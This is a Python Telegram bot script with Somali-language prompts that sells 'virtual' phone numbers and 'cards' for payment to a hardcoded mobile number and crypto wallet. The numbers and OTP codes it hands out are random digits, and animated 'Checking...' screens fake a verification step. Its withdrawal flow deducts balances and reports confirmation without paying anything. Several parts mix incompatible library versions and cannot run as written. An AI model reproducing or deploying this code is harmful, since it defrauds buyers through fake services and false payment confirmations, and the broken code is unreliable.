import os
import asyncio
import random
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command, StateFilter
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.client.default import DefaultBotProperties

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

LOCAL_NUMBER = "+252907868526"
BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

# ================= DATA STORAGE =================
users = {}
withdraw_requests = {}

# ================= STATES =================
class VirtualState(StatesGroup):
    waiting_screenshot = State()

class CardState(StatesGroup):
    screenshot = State()

class WithdrawalState(StatesGroup):
    waiting_address = State()
    waiting_amount = State()

# ================= HELPERS =================
def random_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def generate_otp():
    return "".join(random.choices("0123456789", k=6))

def generate_referral_code():
    return "".join(str(random.randint(0, 9)) for _ in range(8))

async def live_animation(msg: Message, text="Checking", seconds=5):
    for i in range(seconds):
        dots = "." * (i % 4)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")

# ================= START / MAIN MENU =================
@dp.message(Command("start"))
async def start(msg: Message):
    uid = msg.from_user.id

    # Haddii user cusub yahay
    if uid not in users:
        referral_code = generate_referral_code()
        users[uid] = {
            "balance": 0.0,
            "referral_code": referral_code,
            "referrals": []
        }

    # Hubi haddii user uu ku yimid link referral: /start <code>
    args = msg.get_args()
    if args:
        ref_code = args.strip()
        for user_id, data in users.items():
            if data["referral_code"] == ref_code:
                if uid not in data["referrals"]:
                    data["referrals"].append(uid)
                    data["balance"] += 0.6
                    await bot.send_message(user_id, f"🎉 Qof cusub ayaa ku soo biiray adiga! $0.6 ayaa lagu daray balance-kaaga.")
                break

    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="New Order"), KeyboardButton(text="Balance")],
            [KeyboardButton(text="Referral"), KeyboardButton(text="Withdrawal")],
            [KeyboardButton(text="Customer")]
        ],
        resize_keyboard=True
    )

    await msg.answer(
        f"Ku soo dhawoow Service Bot 🤖\n"
        f"Balance: ${users[uid]['balance']:.2f}\n"
        f"Your Referral Code: {users[uid]['referral_code']}",
        reply_markup=kb
    )

# ================= BALANCE =================
@dp.message(F.text == "Balance")
async def show_balance(msg: Message):
    uid = msg.from_user.id
    balance = users.get(uid, {}).get("balance", 0.0)
    await msg.answer(f"💰 Balance-kaaga waa: ${balance:.2f}")

# ================= REFERRAL =================
@dp.message(F.text == "Referral")
async def show_referral(msg: Message):
    uid = msg.from_user.id
    code = users.get(uid, {}).get("referral_code", "N/A")
    referrals = users.get(uid, {}).get("referrals", [])
    await msg.answer(
        f"🎯 Referral Code: {code}\n"
        f"👥 Total Referrals: {len(referrals)}"
    )

# ================= CUSTOMER SUPPORT =================
@dp.message(F.text == "Customer")
async def customer_support(msg: Message):
    await msg.answer(
        "Customer Support 👇\n\n"
        "Fadlan la xiriir:\n"
        "@scholes1"
    )

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual_start")],
        [InlineKeyboardButton(text="CARD", callback_data="card_start")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= VIRTUAL FLOW =================
@dp.callback_query(F.data == "virtual_start")
async def virtual_platform(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WHATSAPP", callback_data="v_platform_WHATSAPP")],
        [InlineKeyboardButton(text="INSTAGRAM", callback_data="v_platform_INSTAGRAM")],
        [InlineKeyboardButton(text="TELEGRAM", callback_data="v_platform_TELEGRAM")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_platform_"))
async def virtual_platform_selected(call: CallbackQuery):
    platform = call.data.split("_")[2]
    number = random_number()

    users[call.from_user.id] = {
        "type": "virtual",
        "platform": platform,
        "number": number,
        "price": "$0.8"
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_payment_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_payment_crypto")]
    ])

    await call.message.edit_text(
        f"Number: {number}\nQiimaha: $0.8\nDooro Payment:",
        reply_markup=kb
    )

# ================= VIRTUAL PAYMENT CHOICE =================
@dp.callback_query(F.data == "v_payment_local")
async def virtual_local_payment(call: CallbackQuery):
    uid = call.from_user.id
    data = users.get(uid)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"v_confirm_payment_{uid}")]
    ])

    await call.message.edit_text(
        f"Lacagta ku dir:\n\n{LOCAL_NUMBER}\n"
        f"Lambarkaaga: {data['number']}\nQiimaha: {data['price']}",
        reply_markup=kb
    )

@dp.callback_query(F.data == "v_payment_crypto")
async def virtual_crypto_payment(call: CallbackQuery):
    uid = call.from_user.id
    data = users.get(uid)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"v_crypto_confirm_{uid}")]
    ])

    text = (
        f"💰 Dir Crypto:\n\n"
        f"USDT: <code>{USDT_ADDRESS}</code>\n"
        f"BNB: <code>{BNB_ADDRESS}</code>\n\n"
        f"Lambarkaaga: {data['number']}\n"
        f"Qiimaha: {data['price']}"
    )

    await call.message.edit_text(text, reply_markup=kb)

# ================= CONFIRM LOCAL =================
@dp.callback_query(F.data.startswith("v_confirm_payment_"))
async def confirm_virtual_payment(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking...")
    await live_animation(msg)

    await call.message.answer("Soo dir Screenshot-ka Payment-ka")
    await state.set_state(VirtualState.waiting_screenshot)

# ================= CONFIRM CRYPTO =================
@dp.callback_query(F.data.startswith("v_crypto_confirm_"))
async def confirm_crypto(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking Crypto Payment...")
    await live_animation(msg)

    await call.message.answer("Soo dir Screenshot-ka Crypto Payment-ka")
    await state.set_state(VirtualState.waiting_screenshot)

# ================= RECEIVE VIRTUAL SCREENSHOT =================
@dp.message(StateFilter(VirtualState.waiting_screenshot), F.photo)
async def receive_virtual_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    data = users.get(uid)

    users[uid]["screenshot"] = msg.photo[-1].file_id
    await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.")

    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}"),
            InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}"),
            InlineKeyboardButton(text="OTP", callback_data=f"admin_otp_{uid}")
        ]
    ])

    caption = (
        f"New Virtual Order\n"
        f"User: {uid}\n"
        f"Platform: {data['platform']}\n"
        f"Number: {data['number']}\n"
        f"Payment: LOCAL/CRYPTO"
    )

    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, reply_markup=kb_admin)
    await state.clear()

# ================= ADMIN CONFIRM =================
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[2])

    await bot.send_message(
        uid,
        f"✅ Payment Confirmed\n\n"
        f"Number: {users[uid]['number']}\n"
        f"Platform: {users[uid]['platform']}\n"
        f"Status: PAID ✅"
    )

    await call.message.edit_caption("✅ PAYMENT CONFIRMED")

# ================= ADMIN REJECT =================
@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[2])

    await bot.send_message(
        uid,
        "❌ Payment lama xaqiijin. Fadlan dib u dir lacagta."
    )

    await call.message.edit_caption("❌ PAYMENT REJECTED")
    users.pop(uid, None)

# ================= ADMIN SEND OTP =================
@dp.callback_query(F.data.startswith("admin_otp_"))
async def admin_send_otp(call: CallbackQuery):
    uid = int(call.data.split("_")[2])

    otp = generate_otp()
    users[uid]["otp"] = otp
    users[uid]["otp_requests"] = 0

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="SHOW OTP", callback_data="show_otp_user")]
    ])

    await bot.send_message(
        uid,
        f"Number: {users[uid]['number']}\n"
        f"Platform: {users[uid]['platform']}\n"
        f"PAYMENT: PAID ✅",
        reply_markup=kb
    )

    await call.message.edit_caption("OTP sent to user")

# ================= USER SHOW OTP =================
@dp.callback_query(F.data == "show_otp_user")
async def show_otp(call: CallbackQuery):
    uid = call.from_user.id
    otp = users.get(uid, {}).get("otp")

    if not otp:
        await call.message.edit_text("❌ OTP lama helin.")
        return

    msg = await call.message.edit_text("OTP Loading...")
    await live_animation(msg, "OTP")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
    ])

    await msg.edit_text(f"OTP Code:\n\n<code>{otp}</code>", reply_markup=kb)

# ================= USER CHECK AGAIN =================
@dp.callback_query(F.data == "check_again_otp")
async def check_again(call: CallbackQuery):
    uid = call.from_user.id

    users[uid]["otp_requests"] += 1
    new_otp = generate_otp()
    users[uid]["otp"] = new_otp

    msg = await call.message.edit_text("Generating new OTP...")
    await live_animation(msg, "OTP")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
    ])

    await msg.edit_text(f"NEW OTP:\n\n<code>{new_otp}</code>", reply_markup=kb)

    # Haddii 2 jeer la codsado
    if users[uid]["otp_requests"] == 2:
        kb_admin = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="CONFIRM FINAL OTP", callback_data=f"admin_final_confirm_{uid}")]
        ])

        await bot.send_message(
            ADMIN_ID,
            f"User {uid} requested OTP 2 times.",
            reply_markup=kb_admin
        )

# ================= ADMIN FINAL CONFIRM =================
@dp.callback_query(F.data.startswith("admin_final_confirm_"))
async def admin_final_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    final_otp = users[uid]["otp"]

    await bot.send_message(
        uid,
        f"✅ OTP Final Confirmed\n\n<code>{final_otp}</code>\nPayment Verified."
    )

    await call.message.edit_text(f"✅ User {uid} OTP Final Confirmed")

# ================= CARD START =================
@dp.callback_query(F.data == "card_start")
async def card_start(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LEVEL 1", callback_data="card_level_1")],
        [InlineKeyboardButton(text="LEVEL 2", callback_data="card_level_2")]
    ])
    await call.message.edit_text("Dooro Card Level:", reply_markup=kb)

# ================= SELECT CARD LEVEL =================
@dp.callback_query(F.data.startswith("card_level_"))
async def card_level_selected(call: CallbackQuery):
    level = call.data.split("_")[-1]
    number = random_number()

    users[call.from_user.id] = {
        "type": "card",
        "card_type": f"LEVEL {level}",
        "number": number,
        "price": "$5"
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="card_payment_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="card_payment_crypto")]
    ])

    await call.message.edit_text(
        f"Card Level: LEVEL {level}\n"
        f"Number: {number}\n"
        f"Qiimaha: $5\n\n"
        f"Dooro Payment:",
        reply_markup=kb
    )

# ================= CARD LOCAL & CRYPTO CONFIRM =================
@dp.callback_query(F.data.startswith("card_payment_"))
async def card_payment(call: CallbackQuery):
    uid = call.from_user.id
    data = users.get(uid)

    payment_type = call.data.split("_")[-1].upper()  # LOCAL or CRYPTO

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"card_confirm_payment_{uid}")]
    ])

    text = f"Lacagta ku dir:\n\n{LOCAL_NUMBER}\n\n" if payment_type == "LOCAL" else \
           f"💰 Dir Crypto:\nUSDT: <code>{USDT_ADDRESS}</code>\nBNB: <code>{BNB_ADDRESS}</code>\n\n"

    await call.message.edit_text(
        f"{text}Number: {data['number']}\nLevel: {data['card_type']}\nQiimaha: {data['price']}",
        reply_markup=kb
    )

# ================= ADMIN PANEL =================
@dp.message(F.text == "Admin")
async def admin_panel(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        await msg.answer("❌ Ma haysid ogolaansho admin.")
        return

    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Add Balance")],
            [KeyboardButton(text="View Users")],
            [KeyboardButton(text="Back")]
        ],
        resize_keyboard=True
    )
    await msg.answer("Admin Panel:", reply_markup=kb)

# ================= ADD BALANCE =================
@dp.message(F.text == "Add Balance")
async def add_balance(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return

    await msg.answer("Fadlan geli user ID iyo amount: \nFormat: user_id amount")
    await VirtualState.waiting_screenshot.set()  # reuse state temporarily

@dp.message(StateFilter(VirtualState.waiting_screenshot))
async def process_add_balance(msg: Message, state: FSMContext):
    try:
        user_id, amount = msg.text.split()
        user_id = int(user_id)
        amount = float(amount)
        if user_id in users:
            users[user_id]["balance"] += amount
            await msg.answer(f"✅ Balance lagu daray {amount} user {user_id}")
        else:
            await msg.answer("❌ User lama helin.")
    except Exception:
        await msg.answer("❌ Format khaldan. Isticmaal: user_id amount")
    finally:
        await state.clear()

# ================= USER MENU =================
@dp.message(F.text == "Balance")
async def show_balance(msg: Message):
    uid = msg.from_user.id
    bal = users.get(uid, {}).get("balance", 0.0)
    await msg.answer(f"💰 Balance-kaaga: ${bal:.2f}")

@dp.message(F.text == "Referal")
async def show_referral(msg: Message):
    uid = msg.from_user.id
    ref_code = users.get(uid, {}).get("referral_code", "N/A")
    await msg.answer(f"🔗 Referral Code-kaaga: {ref_code}")

@dp.message(F.text == "Withdrawal")
async def withdrawal(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="USDT (BEP20)", callback_data="withdraw_usdt")]
    ])
    await msg.answer("Dooro nooca lacag bixinta:", reply_markup=kb)

# ================= WITHDRAWAL =================
@dp.callback_query(F.data == "withdraw_usdt")
async def withdraw_usdt(call: CallbackQuery):
    uid = call.from_user.id
    await call.message.answer("Fadlan geli amount iyo address: \nFormat: amount address")
    await VirtualState.waiting_screenshot.set()  # reuse state temporarily

@dp.message(StateFilter(VirtualState.waiting_screenshot))
async def process_withdrawal(msg: Message, state: FSMContext):
    try:
        amount, address = msg.text.split()
        amount = float(amount)
        uid = msg.from_user.id
        if users[uid]["balance"] < amount:
            await msg.answer("❌ Balance-kaaga kama filna.")
        else:
            users[uid]["balance"] -= amount
            # Notify admin
            kb_admin = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="CONFIRM WITHDRAW", callback_data=f"admin_withdraw_{uid}_{amount}_{address}")]
            ])
            await bot.send_message(
                ADMIN_ID,
                f"💸 User {uid} ayaa codsaday withdrawal\nAmount: {amount}\nAddress: {address}",
                reply_markup=kb_admin
            )
            await msg.answer("✅ Codsigaaga waa la diray admin-ka.")
    except Exception:
        await msg.answer("❌ Format khaldan. Isticmaal: amount address")
    finally:
        await state.clear()

# ================= ADMIN CONFIRM WITHDRAW =================
@dp.callback_query(F.data.startswith("admin_withdraw_"))
async def admin_confirm_withdraw(call: CallbackQuery):
    _, uid, amount, address = call.data.split("_")
    uid = int(uid)
    amount = float(amount)
    await bot.send_message(uid, f"✅ Withdrawal Confirmed\nAmount: {amount}\nAddress: {address}")
    await call.message.edit_text(f"✅ User {uid} withdrawal confirmed.")

# ================= MAIN =================
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
